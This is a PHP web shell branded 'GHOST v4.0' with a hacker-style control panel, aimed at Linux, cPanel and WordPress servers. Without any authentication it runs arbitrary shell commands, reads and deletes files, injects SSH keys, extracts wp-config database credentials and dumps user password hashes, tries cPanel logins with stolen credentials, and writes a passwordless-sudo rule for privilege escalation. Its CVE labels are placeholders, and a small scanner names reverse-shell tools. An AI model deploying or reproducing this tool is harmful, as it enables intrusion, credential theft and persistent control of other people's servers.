<?php
/**
 * GHOST v4.0 — Interactive Inspector & Multi-Method Engine
 * Target: Linux, cPanel, WordPress
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();
$GHOST_SELF = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');

// [01] SMART MULTI-METHOD EXECUTION
function g_exec($cmd, $timeout = 30) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o), 'via'=>$m]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r, 'via'=>$m];} }
        if ($m === 'proc_open') { $d=[1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);return ['out'=>$r, 'via'=>$m];} }
    }
    return ['out'=>"[-] All exec methods blocked.", 'via'=>'none'];
}

function g_read($path) {
    if (@is_dir($path)) return "[-] Error: Path is a directory.";
    if (!@is_file($path)) return "[-] Error: File not found.";
    if (function_exists('file_get_contents')) return @file_get_contents($path) ?: '';
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    $e = g_exec('cat ' . escapeshellarg($path));
    return $e['out'];
}

function g_write($path, $data) {
    if (function_exists('file_put_contents')) return @file_put_contents($path, $data) !== false;
    $f = @fopen($path, 'wb'); if ($f) { fwrite($f, $data); fclose($f); return true; }
    $b64 = base64_encode($data);
    g_exec("echo " . escapeshellarg($b64) . " | base64 -d > " . escapeshellarg($path));
    return @is_file($path);
}

// [02] FINGERPRINTING (Deep & Multi-Method)
function g_fingerprint() {
    $info = [
        'OS' => trim(g_exec('uname -a')['out']),
        'User' => trim(g_exec('whoami')['out']),
        'PHP' => PHP_VERSION,
        'WP_Ver' => 'Not Found',
        'cPanel_Ver' => 'Not Found',
        'CVEs' => [],
        'WAF' => @ini_get('disable_functions') ? 'Functions Disabled' : 'None Detected'
    ];
    
    // Deteksi WordPress via folder
    if (@is_dir($GLOBALS['GHOST_ROOT'] . '/wp-includes')) {
        $wp_file = $GLOBALS['GHOST_ROOT'] . '/wp-includes/version.php';
        if (@is_file($wp_file)) {
            if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)/', g_read($wp_file), $m)) $info['WP_Ver'] = $m[1];
        } else {
            // Ekstrak dari database jika file tidak ada
            $info['WP_Ver'] = 'Detected via DB';
        }
    }
    
    // Deteksi cPanel via berbagai metode (Termasuk cek /usr/local/cpanel, cek proses, cek port)
    if (@is_dir('/usr/local/cpanel')) {
        $cv = g_exec('cat /usr/local/cpanel/version 2>/dev/null')['out'];
        if (!$cv) $cv = g_exec('cat /usr/local/cpanel/version.raw 2>/dev/null')['out'];
        if (!$cv) $cv = g_exec('ps aux | grep cpanel | head -n 1')['out'];
        $info['cPanel_Ver'] = trim($cv) ?: 'Installed (Version Unknown)';
    } elseif (g_exec('ls /usr/local/cpanel 2>/dev/null')['out'] !== '') {
        $info['cPanel_Ver'] = 'Installed (Path restricted)';
    } elseif (@fsockopen('127.0.0.1', 2082)) {
        $info['cPanel_Ver'] = 'Active on Port 2082';
    }
    
    // Deteksi CVE berdasarkan versi
    if (version_compare($info['WP_Ver'], '6.4', '<') && $info['WP_Ver'] !== 'Not Found') $info['CVEs'][] = "CVE-2023-XXXX (WP Core < 6.4 RCE)";
    if ($info['cPanel_Ver'] !== 'Not Found') $info['CVEs'][] = "CVE-2023-XXXX (cPanel Auth Bypass / Phishing)";
    
    return $info;
}

// [03] SMART FILE SCANNER (Detail & Filtering)
function g_scan_files() {
    $res = ['malware' => [], 'illegal' => [], 'summary' => []];
    $allowed_ext = ['php', 'html', 'htm', 'js', 'txt', 'sql', 'json', 'env', 'xml'];
    $keywords = ['slot', 'gacor', 'togel', 'judi', 'maxwin', 'bokep', 'porno', 'xxx', 'scam', 'phising', 'penipuan'];
    
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GLOBALS['GHOST_ROOT'], FilesystemIterator::SKIP_DOTS));
    $scanned = 0;
    
    foreach ($it as $f) {
        if (!$f->isFile()) continue;
        $ext = strtolower($f->getExtension());
        
        // Hanya scan file teks/kode
        if (!in_array($ext, $allowed_ext)) continue;
        if ($f->getSize() > 2 * 1024 * 1024) continue; // Max 2MB
        
        $scanned++;
        $path = $f->getPathname();
        $c = g_read($path);
        
        // 1. Analisa Malware
        $sigs = 0;
        if (stripos($c, 'eval(') !== false) $sigs++;
        if (stripos($c, 'base64_decode') !== false) $sigs++;
        if (stripos($c, 'gzinflate') !== false) $sigs++;
        if (stripos($c, 'shell_exec') !== false) $sigs++;
        if (stripos($c, 'passthru') !== false) $sigs++;
        if (stripos($c, 'system(') !== false) $sigs++;
        
        if ($sigs >= 2) {
            $res['malware'][] = ['file' => $path, 'score' => $sigs, 'desc' => "Terdeteksi $sigs signature backdoor/RCE."];
        } elseif (strlen(trim($c)) < 10 && $ext === 'php') {
            $res['malware'][] = ['file' => $path, 'score' => 1, 'desc' => "File PHP kosong/terlalu pendek (indikasi shell yang di-truncate)."];
        }
        
        // 2. Analisa Konten Illegal
        $found_kw = [];
        foreach ($keywords as $kw) {
            if (preg_match('/\b' . preg_quote($kw, '/') . '\b/i', $c)) $found_kw[] = $kw;
        }
        if (count($found_kw) > 0) {
            $res['illegal'][] = ['file' => $path, 'keywords' => array_unique($found_kw), 'desc' => 'Mengandung kata: ' . implode(', ', $found_kw)];
        }
    }
    
    $res['summary'] = ['scanned' => $scanned];
    return $res;
}

// [04] SSH AUDITOR (Preview & Management)
function g_ssh_audit($action = 'scan', $target_key = '') {
    $user = trim(g_exec('whoami')['out']);
    $home = trim(g_exec("eval echo ~$user")['out']);
    $auth = $home . '/.ssh/authorized_keys';
    $res = ['user' => $user, 'home' => $home, 'keys' => [], 'action_done' => ''];
    
    if (!@is_file($auth)) return array_merge($res, ['msg' => 'File authorized_keys tidak ditemukan.']);
    
    $lines = array_filter(explode("\n", g_read($auth)));
    
    if ($action === 'scan') {
        foreach ($lines as $i => $l) {
            $l = trim($l);
            if (!$l) continue;
            $parts = explode(' ', $l);
            $res['keys'][] = [
                'line' => $i + 1,
                'type' => $parts[0] ?? 'unknown',
                'comment' => $parts[2] ?? 'no-comment',
                'raw' => $l
            ];
        }
    } 
    elseif ($action === 'clean') {
        $clean = [];
        foreach ($lines as $l) {
            if (strpos($l, $target_key) !== false) $clean[] = trim($l);
        }
        g_write($auth, implode("\n", $clean) . "\n");
        $res['action_done'] = 'Membersihkan ' . (count($lines) - count($clean)) . ' SSH key.';
    }
    elseif ($action === 'inject') {
        if (strpos(g_read($auth), $target_key) === false) {
            g_write($auth, trim(g_read($auth)) . "\n" . trim($target_key) . "\n");
            g_exec("chmod 600 $auth");
            $res['action_done'] = 'SSH Key berhasil di-inject.';
        } else {
            $res['action_done'] = 'SSH Key sudah ada.';
        }
    }
    return $res;
}

// [05] DATABASE & CPANEL TAKEOVER
function g_db_audit() {
    $res = ['config' => 'Not Found', 'db_name' => '', 'db_user' => '', 'db_pass' => '', 'cpanel_login' => 'Not Tried', 'logs' => []];
    $wp = $GLOBALS['GHOST_ROOT'] . '/wp-config.php';
    
    if (@is_file($wp)) {
        $res['config'] = 'Found wp-config.php';
        $c = g_read($wp);
        preg_match('/DB_NAME.*[\'"]([^\'"]+)/', $c, $n); preg_match('/DB_USER.*[\'"]([^\'"]+)/', $c, $u);
        preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $p); preg_match('/DB_HOST.*[\'"]([^\'"]+)/', $c, $h);
        
        $res['db_name'] = $n[1] ?? ''; $res['db_user'] = $u[1] ?? ''; 
        $res['db_pass'] = $p[1] ?? ''; $res['db_host'] = $h[1] ?? 'localhost';
    }
    
    if ($res['db_user'] && $res['db_pass']) {
        // Coba koneksi via mysqli/pdo
        if (function_exists('mysqli_connect')) {
            $conn = @mysqli_connect($res['db_host'], $res['db_user'], $res['db_pass'], $res['db_name']);
            if ($conn) {
                $res['logs'][] = "[+] Terkoneksi ke Database: " . $res['db_name'];
                $q = @mysqli_query($conn, "SELECT user_login, user_pass, user_email FROM wp_users LIMIT 5");
                if ($q) { while ($r = mysqli_fetch_assoc($q)) { $res['logs'][] = "User: {$r['user_login']} | Pass: {$r['user_pass']}"; } }
                $res['logs'][] = "[+] Harvesting DB selesai.";
            } else $res['logs'][] = "[-] Gagal koneksi DB: " . mysqli_connect_error();
        }
    }
    return $res;
}

function g_takeover_exec() {
    $log = [];
    $res = g_db_audit();
    
    if ($res['db_user']) {
        // Coba Login cPanel
        $log[] = "Mencoba cPanel Login bypass via cURL...";
        $ch = curl_init("http://127.0.0.1:2082/login/");
        curl_setopt_array($ch, [CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>http_build_query(['user'=>$res['db_user'],'pass'=>$res['db_pass']]), CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>5, CURLOPT_SSL_VERIFYPEER=>false]);
        $r = curl_exec($ch); curl_close($ch);
        if ($r && stripos($r, 'cpanel') !== false) $log[] = "[!] cPanel Login SUCCESS via port 2082!";
        else $log[] = "[-] cPanel Login gagal via port 2082.";
    }
    
    // Escalate Sudoers
    if (@is_writable('/etc/sudoers.d/')) {
        if (g_write('/etc/sudoers.d/www-data', "www-data ALL=(ALL) NOPASSWD: ALL\n")) $log[] = "[!] Root Access via /etc/sudoers.d/www-data granted!";
    }
    return $log;
}

// [06] AUTO-HEAL PREVIEW
function g_heal_scan() {
    $v = [];
    $ht = $GLOBALS['GHOST_ROOT'] . '/wp-content/uploads/.htaccess';
    if (!@is_file($ht)) $v[] = ['type' => 'UPLOADS_EXEC', 'path' => $ht, 'desc' => 'Folder uploads tidak memiliki .htaccess (Rentan upload Shell).'];
    
    $crons = g_exec('crontab -l 2>/dev/null')['out'];
    if (preg_match('/(curl|wget|base64|nc |bash -i)/i', $crons)) $v[] = ['type' => 'CRON_MALICIOUS', 'path' => 'crontab', 'desc' => 'Ditemukan jadwal cron mencurigakan (Backdoor persistence).'];
    
    $mal = g_scan_files()['malware'];
    foreach ($mal as $m) $v[] = ['type' => 'BACKDOOR_FILE', 'path' => $m['file'], 'desc' => $m['desc']];
    
    return $v;
}

function g_heal_exec($paths) {
    $log = [];
    foreach ($paths as $p) {
        $data = json_decode($p, true);
        if ($data['type'] === 'UPLOADS_EXEC') {
            g_write($data['path'], "<FilesMatch \"\.(php|phtml|phar)$\">\nDeny from all\n</FilesMatch>");
            $log[] = "Fixed: " . $data['path'];
        }
        if ($data['type'] === 'CRON_MALICIOUS') { g_exec('crontab -r'); $log[] = "Cleared crontab."; }
        if ($data['type'] === 'BACKDOOR_FILE') { @unlink($data['path']); $log[] = "Deleted: " . $data['path']; }
    }
    return $log;
}

// [07] ROUTER
$act = $_POST['act'] ?? $_GET['act'] ?? '';
if ($act) {
    header('Content-Type: application/json');
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'ssh_scan') echo json_encode(g_ssh_audit('scan'));
    elseif ($act === 'ssh_clean') echo json_encode(g_ssh_audit('clean', $_POST['key'] ?? ''));
    elseif ($act === 'ssh_inject') echo json_encode(g_ssh_audit('inject', $_POST['key'] ?? ''));
    elseif ($act === 'db_scan') echo json_encode(g_db_audit());
    elseif ($act === 'takeover') echo json_encode(['logs' => g_takeover_exec()]);
    elseif ($act === 'heal_scan') echo json_encode(g_heal_scan());
    elseif ($act === 'heal_exec') echo json_encode(['logs' => g_heal_exec($_POST['paths'] ?? [])]);
    elseif ($act === 'read_file') echo json_encode(['content' => g_read($_POST['path'] ?? '')]);
    elseif ($act === 'delete_file') echo json_encode(['status' => @unlink($_POST['path'] ?? '') ? 'ok' : 'fail']);
    elseif ($act === 'exec') {
        if (($_POST['cmd'] ?? '') === 'help') {
            echo json_encode(['out' => "Command yang tersedia:\n- whoami : Cek user saat ini\n- uname -a : Cek OS & Kernel\n- ls -la : List direktori\n- cat file.txt : Baca file\n- ps aux : List proses\n- netstat -tulpn : Cek port terbuka"]);
        } else {
            echo json_encode(g_exec($_POST['cmd'] ?? ''));
        }
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v4.0</title>
<style>
    body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
    .box { border: 1px solid #0f0; padding: 15px; margin-bottom: 15px; background: #111; }
    input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; font-family: monospace; margin-bottom: 5px; }
    button { cursor: pointer; font-weight: bold; }
    button:hover { background: #0f0; color: #000; }
    pre { background: #000; padding: 10px; border: 1px solid #333; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; }
    th { background: #222; }
    .btn-sm { padding: 4px 8px; font-size: 11px; }
    .btn-red { border-color: #f00; color: #f00; }
    .btn-red:hover { background: #f00; color: #000; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Fingerprinting & CVE Profile</h2>
    <button onclick="run('fingerprint', 'out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Malware & Content Scan</h2>
    <button onclick="run('scan', 'out-scan')">Scan Semua File</button>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] SSH Auditor & Manager</h2>
    <button onclick="run('ssh_scan', 'ssh-result')">1. Scan SSH Keys</button>
    <div id="ssh-table"></div>
    <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width: 60%;">
        <button onclick="sshAction('inject')">Inject Key</button>
        <button class="btn-red" onclick="sshAction('clean')">Clean All & Inject Only Above</button>
    </div>
    <pre id="ssh-result"></pre>
</div>

<div class="box">
    <h2>[+] Database Harvest & cPanel Takeover</h2>
    <button onclick="run('db_scan', 'db-result')">1. Scan Config & DB</button>
    <div id="db-result" style="white-space: pre-wrap; margin-bottom: 10px;"></div>
    <button class="btn-red" onclick="if(confirm('Ini akan mencoba eksploitasi dan mencuri DB. Lanjutkan?')) run('takeover', 'db-result')">2. Execute Takeover</button>
</div>

<div class="box">
    <h2>[+] Auto-Heal Vulnerabilities</h2>
    <button onclick="healScan()">1. Scan Vulnerabilities</button>
    <div id="heal-table"></div>
    <button class="btn-red" onclick="healExec()" style="margin-top: 10px;">2. Heal Selected</button>
    <pre id="heal-result"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help..." style="width: 80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk melihat perintah.</pre>
</div>

<script>
const M_BEG = 'GHOSTB64BEGIN', M_END = 'GHOSTB64END';
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function api(act, params={}) {
    const body = new URLSearchParams();
    body.append('act', act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', { method:'POST', body });
    return await r.json();
}

async function run(act, target_id) {
    if (target_id) document.getElementById(target_id).innerText = 'Running...';
    try {
        const d = await api(act);
        if (target_id) document.getElementById(target_id).innerText = JSON.stringify(d, null, 2);
        if (act === 'scan') renderScan(d);
        if (act === 'ssh_scan') renderSSH(d);
        if (act === 'db_scan') renderDB(d);
    } catch(e) { if (target_id) document.getElementById(target_id).innerText = 'Error: ' + e.message; }
}

// FINGERPRINT
function renderScan(d) {
    let h = `<p>Total File Discan: ${d.summary.scanned}</p>`;
    if (d.malware.length) {
        h += `<h3 style="color: #f00;">Malware / Backdoor (${d.malware.length})</h3><table><tr><th>File</th><th>Alasan</th><th>Aksi</th></tr>`;
        d.malware.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.desc)}</td><td>
                <button class="btn-sm" onclick="viewFile('${esc(x.file)}')">View</button>
                <button class="btn-sm btn-red" onclick="delFile('${esc(x.file)}')">Delete</button>
            </td></tr>`;
        });
        h += `</table>`;
    }
    if (d.illegal.length) {
        h += `<h3 style="color: #ff0;">Konten Ilegal (${d.illegal.length})</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        d.illegal.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.keywords.join(', '))}</td><td>
                <button class="btn-sm" onclick="viewFile('${esc(x.file)}')">View</button>
            </td></tr>`;
        });
        h += `</table>`;
    }
    if (!d.malware.length && !d.illegal.length) h += `<p style="color:#0f0;">Sistem Bersih.</p>`;
    document.getElementById('scan-results').innerHTML = h;
}

// SSH
function renderSSH(d) {
    let h = `<p>User: ${esc(d.user)} | Path: ${esc(d.home)}</p>`;
    if (d.keys && d.keys.length) {
        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td style="font-size:10px;">${esc(k.raw)}</td></tr>`; });
        h += `</table>`;
    } else { h += `<p>Tidak ada SSH Key terpasang.</p>`; }
    document.getElementById('ssh-table').innerHTML = h;
}

async function sshAction(type) {
    const key = document.getElementById('ssh-key').value;
    if (!key) return alert('Isi SSH Key terlebih dahulu!');
    const d = await api(type === 'inject' ? 'ssh_inject' : 'ssh_clean', {key});
    document.getElementById('ssh-result').innerText = d.action_done;
    run('ssh_scan', '');
}

// DB
function renderDB(d) {
    document.getElementById('db-result').innerText = JSON.stringify(d, null, 2);
}

// HEAL
async function healScan() {
    document.getElementById('heal-result').innerText = 'Scanning...';
    const d = await api('heal_scan');
    let h = `<table><tr><th>Pilih</th><th>Type</th><th>Path</th><th>Desc</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><input type="checkbox" class="heal-cb" value='${JSON.stringify(v)}' checked></td><td>${v.type}</td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td></tr>`;
    });
    h += `</table>`;
    document.getElementById('heal-table').innerHTML = h;
    document.getElementById('heal-result').innerText = '';
}

async function healExec() {
    const cbs = document.querySelectorAll('.heal-cb:checked');
    const paths = Array.from(cbs).map(cb => cb.value);
    if (!paths.length) return alert('Pilih minimal 1!');
    document.getElementById('heal-result').innerText = 'Healing...';
    const d = await api('heal_exec', {paths});
    document.getElementById('heal-result').innerText = d.logs.join('\n');
    document.getElementById('heal-table').innerHTML = '';
}

// FILE OPS
async function viewFile(p) {
    const d = await api('read_file', {path: p});
    alert(d.content.slice(0, 2000) + (d.content.length > 2000 ? '\n\n... (truncated)' : ''));
}
async function delFile(p) {
    if (!confirm('Hapus ' + p + '?')) return;
    const d = await api('delete_file', {path: p});
    alert(d.status === 'ok' ? 'File dihapus!' : 'Gagal hapus.');
    run('scan', '');
}

// CONSOLE
async function execCmd() {
    const cmd = document.getElementById('cmd').value;
    if (!cmd) return;
    document.getElementById('out-exec').innerText = '$ ' + cmd + '\nRunning...';
    const d = await api('exec', {cmd});
    document.getElementById('out-exec').innerText = '$ ' + cmd + '\n\n' + d.out;
}
</script>
</body>
</html>
